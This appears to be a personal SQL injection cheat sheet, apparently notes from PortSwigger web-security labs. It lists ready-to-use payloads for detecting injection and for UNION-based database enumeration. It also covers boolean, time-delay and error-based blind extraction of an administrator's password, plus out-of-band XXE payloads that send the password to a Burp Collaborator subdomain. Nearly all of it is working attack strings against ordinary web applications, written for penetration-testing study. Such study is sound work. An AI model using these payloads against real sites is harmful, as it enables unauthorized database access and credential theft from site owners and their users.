
## Contents

- [[#Detection Payloads]]
- [[#Exploitation Payloads]]
	- [[#UNION Attacks]]
	- [[#Examine Database]]
	- [[#Blind SQL Injection]]
		- [[#Error-based blind SQL Injection]]

## Resources

[Portswigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[OWASP Web Pentest Guide SQL Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection )

## Detection Payloads

>Syntax varies between database types!
>For different syntax see  [Portswigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

To detect if SQL injection is possible:

- submit `'` to cause errors or anomalies
- submit `'--` to truncate query 
- submit boolean conditions and see if responses differ compared to original response
	- `'OR 1=1--` -> always true, response size usually larger
	- `'OR 1=2--` -> always false
	- `'OR '1'='1`
	- `'OR '1'='2`
- submit conditional payloads and identify if there is a difference in the responses from `1=1` and `1=2`
	- `'AND 1=1--`
	- `'AND 1=2--`
	- `'AND '1'='1`
	- `'AND '1'='2
- submit syntax that evaluates to the base (original) value, and to a different value, and look for systematic differences in the application responses. Do this via string concatenation:
	- Original: `?category=Gifts`
	- Resolving to original value: `?category=Gift'||'s
	- Not resolving to original value: `?category=Gifts'||'sss
- submit time delay payloads
	- MySQL: `;select sleep(10)--`
	- `TrackingId=x'||pg_sleep(10)--`
- submit OAST payloads

## Exploitation Payloads

### UNION Attacks

Steps
1. Determine number of columns required
2. Find columns with useful datatype
3. Use SQLi UNION attack to retrieve data

Determine number of columns required
- `'+UNION+SELECT+NULL--`
- `'+UNION+SELECT+NULL,NULL--`
- increase columns until no error

Find columns with useful datatype
- replace each NULL with a string or other relevant data type
- `'+UNION+SELECT+'abc','def'--`

Use UNION attack
- if tables are compatible (correct number of columns with useful datatype)
- `' UNION SELECT username, password FROM users--`

UNION attack, retrieving multiple values in a single column (Oracle)
- `' UNION SELECT NULL,username || '~' || password FROM users--`


### Examine Database

Querying database type and version

| Database type    | Query                     |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

UNION attack
- `' UNION SELECT @@version--`

Query database type and version on oracle
- verify query is returning two colums with text
	- `'+UNION+SELECT+'abc','def'+FROM+dual--`
- query db version
	- `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

Query database type and version on microsoft and mySQL
- `'+UNION+SELECT+'abc','def'#`
- `'+UNION+SELECT+@@version,+NULL#`

Listing database contents on non-oracle databases
- `'+UNION+SELECT+'abc','def'--`
- `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
- `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
- `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`

Listing contents of Oracle database
- `'+UNION+SELECT+'abc','def'+FROM+dual--`
- `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
- `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`
- `'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`

### Blind SQL Injection

>This can happen in a cookie! (like `TrackingId=xyz' AND '1'='1`)

Triggering conditional responses
- modify tracking cookie with conditional responses
	- `TrackingId=xyz' AND '1'='1`
	- `TrackingId=xyz' AND '1'='2`
- confirm that there is a table called `users`
	- `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
- confirm that there is a user called `administrator`
	- `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
- find password length
	- `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
	- increment the 1 with Burp Intruder until condition not true anymore
- find password with Burp Intruder 
	- `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`

Blind SQL Injection with time delays
- `TrackingId=x'||pg_sleep(10)--`

Time delays and information retrieval
- retrieve password one character at the time with Burp Intruder
	- `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

Blind SQL injection using out-of-band (OAST) techniques (with XXE)
- `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

Blind SQL injection with OAST data exfiltration
- `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
#### Error-based blind SQL Injection

Triggering conditional errors
- modify tracking cookie
	- `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a -> no error
	- `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a` -> error
- retrieve data one character at the time (error when condition true)
	- `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
- from Lab
	- `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Visible error-based SQL Injection
- use `CAST()` to convert from one data type to another and trying to cause an error `ERROR: invalid input syntax for type integer: "Example data"`
- retrieve usernames
	- `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--`
- retrieve password from first user
	- `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`


